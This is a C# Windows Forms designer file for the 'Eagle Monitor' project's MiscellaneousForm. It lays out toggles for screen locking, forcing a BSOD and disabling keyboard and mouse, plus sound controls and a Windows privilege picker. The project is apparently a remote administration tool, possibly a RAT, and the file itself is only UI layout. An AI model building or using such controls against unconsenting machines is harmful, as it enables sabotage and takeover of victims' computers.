
namespace Eagle_Monitor.Forms
{
    partial class MiscellaneousForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MiscellaneousForm));
            this.closeButton = new Eagle_Monitor.Controls.WindowsButton();
            this.maximizeButton = new Eagle_Monitor.Controls.WindowsButton();
            this.panel1 = new System.Windows.Forms.Panel();
            this.label6 = new System.Windows.Forms.Label();
            this.muteSoundToggleSwitch = new ns1.SiticoneToggleSwitch();
            this.windowsButton1 = new Eagle_Monitor.Controls.WindowsButton();
            this.label5 = new System.Windows.Forms.Label();
            this.privilegeComboBox = new System.Windows.Forms.ComboBox();
            this.label4 = new System.Windows.Forms.Label();
            this.mouseToggleSwitch = new ns1.SiticoneToggleSwitch();
            this.label3 = new System.Windows.Forms.Label();
            this.keyboardToggleSwitch = new ns1.SiticoneToggleSwitch();
            this.label2 = new System.Windows.Forms.Label();
            this.BSODToggleSwitch = new ns1.SiticoneToggleSwitch();
            this.label1 = new System.Windows.Forms.Label();
            this.screenLockerToggleSwitch = new ns1.SiticoneToggleSwitch();
            this.minimizeButton = new Eagle_Monitor.Controls.WindowsButton();
            this.audioUpWindowsButton = new Eagle_Monitor.Controls.WindowsButton();
            this.audioDownWindowsButton = new Eagle_Monitor.Controls.WindowsButton();
            this.label7 = new System.Windows.Forms.Label();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // closeButton
            // 
            this.closeButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.closeButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(173)))), ((int)(((byte)(239)))));
            this.closeButton.FlatAppearance.BorderSize = 0;
            this.closeButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(153)))), ((int)(((byte)(209)))));
            this.closeButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(193)))), ((int)(((byte)(255)))));
            this.closeButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.closeButton.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.closeButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.closeButton.Location = new System.Drawing.Point(190, 0);
            this.closeButton.Name = "closeButton";
            this.closeButton.Size = new System.Drawing.Size(33, 30);
            this.closeButton.TabIndex = 26;
            this.closeButton.Text = "x";
            this.closeButton.UseVisualStyleBackColor = false;
            this.closeButton.Click += new System.EventHandler(this.closeButton_Click);
            // 
            // maximizeButton
            // 
            this.maximizeButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.maximizeButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(173)))), ((int)(((byte)(239)))));
            this.maximizeButton.FlatAppearance.BorderSize = 0;
            this.maximizeButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(153)))), ((int)(((byte)(209)))));
            this.maximizeButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(193)))), ((int)(((byte)(255)))));
            this.maximizeButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.maximizeButton.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.maximizeButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.maximizeButton.Location = new System.Drawing.Point(151, 0);
            this.maximizeButton.Name = "maximizeButton";
            this.maximizeButton.Size = new System.Drawing.Size(33, 30);
            this.maximizeButton.TabIndex = 25;
            this.maximizeButton.Text = "🗖";
            this.maximizeButton.UseVisualStyleBackColor = false;
            this.maximizeButton.Click += new System.EventHandler(this.maximizeButton_Click);
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.White;
            this.panel1.Controls.Add(this.label7);
            this.panel1.Controls.Add(this.audioDownWindowsButton);
            this.panel1.Controls.Add(this.audioUpWindowsButton);
            this.panel1.Controls.Add(this.label6);
            this.panel1.Controls.Add(this.muteSoundToggleSwitch);
            this.panel1.Controls.Add(this.windowsButton1);
            this.panel1.Controls.Add(this.label5);
            this.panel1.Controls.Add(this.privilegeComboBox);
            this.panel1.Controls.Add(this.label4);
            this.panel1.Controls.Add(this.mouseToggleSwitch);
            this.panel1.Controls.Add(this.label3);
            this.panel1.Controls.Add(this.keyboardToggleSwitch);
            this.panel1.Controls.Add(this.label2);
            this.panel1.Controls.Add(this.BSODToggleSwitch);
            this.panel1.Controls.Add(this.label1);
            this.panel1.Controls.Add(this.screenLockerToggleSwitch);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.panel1.Location = new System.Drawing.Point(3, 30);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(220, 329);
            this.panel1.TabIndex = 0;
            // 
            // label6
            // 
            this.label6.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(14, 172);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(77, 13);
            this.label6.TabIndex = 35;
            this.label6.Text = "Mute Sound :";
            // 
            // muteSoundToggleSwitch
            // 
            this.muteSoundToggleSwitch.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.muteSoundToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.muteSoundToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.muteSoundToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.muteSoundToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
            this.muteSoundToggleSwitch.CheckedState.Parent = this.muteSoundToggleSwitch;
            this.muteSoundToggleSwitch.Location = new System.Drawing.Point(3, 188);
            this.muteSoundToggleSwitch.Name = "muteSoundToggleSwitch";
            this.muteSoundToggleSwitch.ShadowDecoration.Parent = this.muteSoundToggleSwitch;
            this.muteSoundToggleSwitch.Size = new System.Drawing.Size(202, 20);
            this.muteSoundToggleSwitch.TabIndex = 34;
            this.muteSoundToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.muteSoundToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.muteSoundToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.muteSoundToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
            this.muteSoundToggleSwitch.UncheckedState.Parent = this.muteSoundToggleSwitch;
            this.muteSoundToggleSwitch.CheckedChanged += new System.EventHandler(this.muteSoundToggleSwitch_CheckedChanged);
            // 
            // windowsButton1
            // 
            this.windowsButton1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.windowsButton1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(173)))), ((int)(((byte)(239)))));
            this.windowsButton1.FlatAppearance.BorderSize = 0;
            this.windowsButton1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(153)))), ((int)(((byte)(209)))));
            this.windowsButton1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(193)))), ((int)(((byte)(255)))));
            this.windowsButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.windowsButton1.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.windowsButton1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.windowsButton1.Location = new System.Drawing.Point(147, 289);
            this.windowsButton1.Name = "windowsButton1";
            this.windowsButton1.Size = new System.Drawing.Size(61, 21);
            this.windowsButton1.TabIndex = 27;
            this.windowsButton1.Text = "Get ";
            this.windowsButton1.UseVisualStyleBackColor = false;
            this.windowsButton1.Click += new System.EventHandler(this.windowsButton1_Click);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(17, 273);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(61, 13);
            this.label5.TabIndex = 27;
            this.label5.Text = "Privileges :";
            // 
            // privilegeComboBox
            // 
            this.privilegeComboBox.BackColor = System.Drawing.Color.White;
            this.privilegeComboBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.privilegeComboBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.privilegeComboBox.FormattingEnabled = true;
            this.privilegeComboBox.Items.AddRange(new object[] {
            "SeCreateTokenPrivilege",
            "SeAssignPrimaryTokenPrivilege",
            "SeLockMemoryPrivilege",
            "SeIncreaseQuotaPrivilege",
            "SeUnsolicitedInputPrivilege",
            "SeMachineAccountPrivilege",
            "SeTcbPrivilege",
            "SeSecurityPrivilege",
            "SeTakeOwnershipPrivilege",
            "SeLoadDriverPrivilege",
            "SeSystemProfilePrivilege",
            "SeSystemtimePrivilege",
            "SeProfileSingleProcessPrivilege",
            "SeIncreaseBasePriorityPrivilege",
            "SeCreatePagefilePrivilege",
            "SeCreatePermanentPrivilege",
            "SeBackupPrivilege",
            "SeRestorePrivilege",
            "SeShutdownPrivilege",
            "SeDebugPrivilege",
            "SeAuditPrivilege",
            "SeSystemEnvironmentPrivilege",
            "SeChangeNotifyPrivilege",
            "SeRemoteShutdownPrivilege",
            "SeUndockPrivilege",
            "SeSyncAgentPrivilege",
            "SeEnableDelegationPrivilege",
            "SeManageVolumePrivilege",
            "SeImpersonatePrivilege",
            "SeCreateGlobalPrivilege",
            "SeTrustedCredManAccessPrivilege",
            "SeRelabelPrivilege",
            "SeIncreaseWorkingSetPrivilege",
            "SeTimeZonePrivilege",
            "SeCreateSymbolicLinkPrivilege"});
            this.privilegeComboBox.Location = new System.Drawing.Point(6, 289);
            this.privilegeComboBox.Name = "privilegeComboBox";
            this.privilegeComboBox.Size = new System.Drawing.Size(136, 21);
            this.privilegeComboBox.TabIndex = 28;
            // 
            // label4
            // 
            this.label4.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(17, 131);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(89, 13);
            this.label4.TabIndex = 33;
            this.label4.Text = "Disable Mouse :";
            // 
            // mouseToggleSwitch
            // 
            this.mouseToggleSwitch.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.mouseToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.mouseToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.mouseToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.mouseToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
            this.mouseToggleSwitch.CheckedState.Parent = this.mouseToggleSwitch;
            this.mouseToggleSwitch.Location = new System.Drawing.Point(6, 147);
            this.mouseToggleSwitch.Name = "mouseToggleSwitch";
            this.mouseToggleSwitch.ShadowDecoration.Parent = this.mouseToggleSwitch;
            this.mouseToggleSwitch.Size = new System.Drawing.Size(202, 20);
            this.mouseToggleSwitch.TabIndex = 32;
            this.mouseToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.mouseToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.mouseToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.mouseToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
            this.mouseToggleSwitch.UncheckedState.Parent = this.mouseToggleSwitch;
            this.mouseToggleSwitch.CheckedChanged += new System.EventHandler(this.mouseToggleSwitch_CheckedChanged);
            // 
            // label3
            // 
            this.label3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(17, 92);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(102, 13);
            this.label3.TabIndex = 31;
            this.label3.Text = "Disable Keyboard :";
            // 
            // keyboardToggleSwitch
            // 
            this.keyboardToggleSwitch.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.keyboardToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.keyboardToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.keyboardToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.keyboardToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
            this.keyboardToggleSwitch.CheckedState.Parent = this.keyboardToggleSwitch;
            this.keyboardToggleSwitch.Location = new System.Drawing.Point(6, 108);
            this.keyboardToggleSwitch.Name = "keyboardToggleSwitch";
            this.keyboardToggleSwitch.ShadowDecoration.Parent = this.keyboardToggleSwitch;
            this.keyboardToggleSwitch.Size = new System.Drawing.Size(202, 20);
            this.keyboardToggleSwitch.TabIndex = 30;
            this.keyboardToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.keyboardToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.keyboardToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.keyboardToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
            this.keyboardToggleSwitch.UncheckedState.Parent = this.keyboardToggleSwitch;
            this.keyboardToggleSwitch.CheckedChanged += new System.EventHandler(this.keyboardToggleSwitch_CheckedChanged);
            // 
            // label2
            // 
            this.label2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(17, 51);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(42, 13);
            this.label2.TabIndex = 29;
            this.label2.Text = "BSOD :";
            // 
            // BSODToggleSwitch
            // 
            this.BSODToggleSwitch.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.BSODToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.BSODToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.BSODToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.BSODToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
            this.BSODToggleSwitch.CheckedState.Parent = this.BSODToggleSwitch;
            this.BSODToggleSwitch.Location = new System.Drawing.Point(6, 67);
            this.BSODToggleSwitch.Name = "BSODToggleSwitch";
            this.BSODToggleSwitch.ShadowDecoration.Parent = this.BSODToggleSwitch;
            this.BSODToggleSwitch.Size = new System.Drawing.Size(202, 20);
            this.BSODToggleSwitch.TabIndex = 28;
            this.BSODToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.BSODToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.BSODToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.BSODToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
            this.BSODToggleSwitch.UncheckedState.Parent = this.BSODToggleSwitch;
            this.BSODToggleSwitch.CheckedChanged += new System.EventHandler(this.BSODToggleSwitch_CheckedChanged);
            // 
            // label1
            // 
            this.label1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(17, 12);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(80, 13);
            this.label1.TabIndex = 1;
            this.label1.Text = "ScreenLocker :";
            // 
            // screenLockerToggleSwitch
            // 
            this.screenLockerToggleSwitch.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.screenLockerToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.screenLockerToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.screenLockerToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.screenLockerToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
            this.screenLockerToggleSwitch.CheckedState.Parent = this.screenLockerToggleSwitch;
            this.screenLockerToggleSwitch.Location = new System.Drawing.Point(6, 28);
            this.screenLockerToggleSwitch.Name = "screenLockerToggleSwitch";
            this.screenLockerToggleSwitch.ShadowDecoration.Parent = this.screenLockerToggleSwitch;
            this.screenLockerToggleSwitch.Size = new System.Drawing.Size(202, 20);
            this.screenLockerToggleSwitch.TabIndex = 0;
            this.screenLockerToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.screenLockerToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.screenLockerToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
            this.screenLockerToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
            this.screenLockerToggleSwitch.UncheckedState.Parent = this.screenLockerToggleSwitch;
            this.screenLockerToggleSwitch.CheckedChanged += new System.EventHandler(this.screenLockerToggleSwitch_CheckedChanged);
            // 
            // minimizeButton
            // 
            this.minimizeButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.minimizeButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(173)))), ((int)(((byte)(239)))));
            this.minimizeButton.FlatAppearance.BorderSize = 0;
            this.minimizeButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(153)))), ((int)(((byte)(209)))));
            this.minimizeButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(193)))), ((int)(((byte)(255)))));
            this.minimizeButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.minimizeButton.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.minimizeButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.minimizeButton.Location = new System.Drawing.Point(112, 0);
            this.minimizeButton.Name = "minimizeButton";
            this.minimizeButton.Size = new System.Drawing.Size(33, 30);
            this.minimizeButton.TabIndex = 24;
            this.minimizeButton.Text = "-";
            this.minimizeButton.UseVisualStyleBackColor = false;
            this.minimizeButton.Click += new System.EventHandler(this.minimizeButton_Click);
            // 
            // audioUpWindowsButton
            // 
            this.audioUpWindowsButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.audioUpWindowsButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(173)))), ((int)(((byte)(239)))));
            this.audioUpWindowsButton.FlatAppearance.BorderSize = 0;
            this.audioUpWindowsButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(153)))), ((int)(((byte)(209)))));
            this.audioUpWindowsButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(193)))), ((int)(((byte)(255)))));
            this.audioUpWindowsButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.audioUpWindowsButton.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.audioUpWindowsButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.audioUpWindowsButton.Location = new System.Drawing.Point(112, 232);
            this.audioUpWindowsButton.Name = "audioUpWindowsButton";
            this.audioUpWindowsButton.Size = new System.Drawing.Size(100, 30);
            this.audioUpWindowsButton.TabIndex = 27;
            this.audioUpWindowsButton.Text = "Up";
            this.audioUpWindowsButton.UseVisualStyleBackColor = false;
            this.audioUpWindowsButton.Click += new System.EventHandler(this.audioUpWindowsButton_Click);
            // 
            // audioDownWindowsButton
            // 
            this.audioDownWindowsButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.audioDownWindowsButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(173)))), ((int)(((byte)(239)))));
            this.audioDownWindowsButton.FlatAppearance.BorderSize = 0;
            this.audioDownWindowsButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(153)))), ((int)(((byte)(209)))));
            this.audioDownWindowsButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(193)))), ((int)(((byte)(255)))));
            this.audioDownWindowsButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.audioDownWindowsButton.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.audioDownWindowsButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.audioDownWindowsButton.Location = new System.Drawing.Point(6, 232);
            this.audioDownWindowsButton.Name = "audioDownWindowsButton";
            this.audioDownWindowsButton.Size = new System.Drawing.Size(100, 30);
            this.audioDownWindowsButton.TabIndex = 27;
            this.audioDownWindowsButton.Text = "Down";
            this.audioDownWindowsButton.UseVisualStyleBackColor = false;
            this.audioDownWindowsButton.Click += new System.EventHandler(this.audioDownWindowsButton_Click);
            // 
            // label7
            // 
            this.label7.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(3, 211);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(47, 13);
            this.label7.TabIndex = 36;
            this.label7.Text = "Sound :";
            // 
            // MiscellaneousForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(226, 362);
            this.Controls.Add(this.closeButton);
            this.Controls.Add(this.maximizeButton);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.minimizeButton);
            this.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "MiscellaneousForm";
            this.Padding = new System.Windows.Forms.Padding(3, 30, 3, 3);
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "MiscellaneousForm";
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Panel panel1;
        private Controls.WindowsButton closeButton;
        private Controls.WindowsButton maximizeButton;
        private Controls.WindowsButton minimizeButton;
        private System.Windows.Forms.Label label1;
        private ns1.SiticoneToggleSwitch screenLockerToggleSwitch;
        private System.Windows.Forms.Label label2;
        private ns1.SiticoneToggleSwitch BSODToggleSwitch;
        private System.Windows.Forms.Label label3;
        private ns1.SiticoneToggleSwitch keyboardToggleSwitch;
        private System.Windows.Forms.Label label4;
        private ns1.SiticoneToggleSwitch mouseToggleSwitch;
        private Controls.WindowsButton windowsButton1;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.ComboBox privilegeComboBox;
        private System.Windows.Forms.Label label6;
        private ns1.SiticoneToggleSwitch muteSoundToggleSwitch;
        private System.Windows.Forms.Label label7;
        private Controls.WindowsButton audioDownWindowsButton;
        private Controls.WindowsButton audioUpWindowsButton;
    }
}